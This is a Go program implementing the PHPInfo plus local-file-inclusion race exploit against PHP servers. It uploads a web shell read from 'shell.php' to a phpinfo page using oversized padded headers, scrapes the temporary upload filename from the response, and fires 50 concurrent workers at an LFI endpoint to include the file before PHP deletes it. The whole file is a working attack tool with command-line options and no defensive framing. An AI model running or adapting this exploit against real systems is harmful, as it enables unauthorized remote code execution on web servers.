package main

import (
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
)

var (
	PADDING    = strings.Repeat("A", 5000)
	host       string
	port       string
	requestStr string
	proxyURL   string
	phpinfoURL string
	lfiURL     string
)

func main() {
	flag.StringVar(&proxyURL, "proxy", "", "HTTP proxy URL (e.g., http://localhost:8080)")
	flag.StringVar(&phpinfoURL, "phpinfo", "", "URL to phpinfo.php")
	flag.StringVar(&lfiURL, "lfi", "", "URL to LFI endpoint (use %s as placeholder for file path)")
	flag.Parse()

	if phpinfoURL == "" || lfiURL == "" {
		fmt.Println("Error: Both -phpinfo and -lfi arguments are required")
		flag.Usage()
		os.Exit(1)
	}

	payload, err := os.ReadFile("shell.php")
	if err != nil {
		panic(err)
	}

	parsedPhpinfoURL, err := url.Parse(phpinfoURL)
	if err != nil {
		panic(err)
	}

	host = parsedPhpinfoURL.Hostname()
	port = parsedPhpinfoURL.Port()
	if port == "" {
		switch parsedPhpinfoURL.Scheme {
		case "http":
			port = "80"
		case "https":
			port = "443"
		default:
			panic("unknown scheme")
		}
	}

	var requestData strings.Builder
	requestData.WriteString("-----------------------------7dbff1ded0714\r\n")
	requestData.WriteString("Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\r\n")
	requestData.WriteString("Content-Type: text/plain\r\n")
	requestData.WriteString("\r\n")
	requestData.Write(payload)
	requestData.WriteString("\r\n")
	requestData.WriteString("-----------------------------7dbff1ded0714\r\n")
	requestDataStr := requestData.String()

	path := parsedPhpinfoURL.Path
	if path == "" {
		path = "/"
	}
	path += "?a=" + url.QueryEscape(PADDING)
	headers := []string{
		fmt.Sprintf("POST %s HTTP/1.1\r\n", path),
		fmt.Sprintf("Cookie: othercookie=%s\r\n", PADDING),
		fmt.Sprintf("HTTP_ACCEPT: %s\r\n", PADDING),
		fmt.Sprintf("HTTP_USER_AGENT: %s\r\n", PADDING),
		fmt.Sprintf("HTTP_ACCEPT_LANGUAGE: %s\r\n", PADDING),
		fmt.Sprintf("HTTP_PRAGMA: %s\r\n", PADDING),
		"Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n",
		fmt.Sprintf("Content-Length: %d\r\n", len(requestDataStr)),
		fmt.Sprintf("Host: %s\r\n", parsedPhpinfoURL.Host),
		"\r\n",
	}

	requestStr = strings.Join(headers, "") + requestDataStr

	_, bytesRead, err := makeRequest(0)
	if err != nil {
		panic(err)
	}

	var wg sync.WaitGroup
	workers := 50
	resultChan := make(chan bool)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				localTmpName, _, err := makeRequest(bytesRead + 256)
				if err != nil {
					panic(err)
				}

				fmt.Printf("Trying tmp_name: %s\n", localTmpName)

				client := &http.Client{}
				if proxyURL != "" {
					proxyURLParsed, err := url.Parse(proxyURL)
					if err != nil {
						panic(err)
					}
					client.Transport = &http.Transport{
						Proxy: http.ProxyURL(proxyURLParsed),
					}
				}

				resp, err := client.Get(fmt.Sprintf(lfiURL, localTmpName))
				if err != nil {
					panic(err)
				}
				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					panic(err)
				}

				if !strings.Contains(string(body), "No such file or directory") {
					fmt.Println("Exploit successful! File found.")
					resultChan <- true
					return
				}
			}
		}()
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	<-resultChan
}

func makeRequest(bytesToRead int) (string, int, error) {
	conn, err := net.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		return "", 0, fmt.Errorf("dial: %v", err)
	}
	defer conn.Close()
	if _, err := conn.Write([]byte(requestStr)); err != nil {
		return "", 0, fmt.Errorf("write: %v", err)
	}

	var resp []byte
	if bytesToRead == 0 {
		resp, err = io.ReadAll(conn)
		if err != nil {
			return "", 0, fmt.Errorf("read all: %v", err)
		}
	} else {
		resp = make([]byte, bytesToRead)
		_, err := io.ReadFull(conn, resp)
		if err != nil {
			return "", 0, fmt.Errorf("read %d bytes: %v", bytesToRead, err)
		}
	}

	respStr := string(resp)

	re := regexp.MustCompile(`tmp_name\] =&gt; (.*)`)
	match := re.FindStringSubmatchIndex(respStr)
	if match == nil {
		return "", 0, fmt.Errorf("tmp_name not found")
	}

	tmpName := respStr[match[2]:match[3]]
	return tmpName, match[1], nil
}
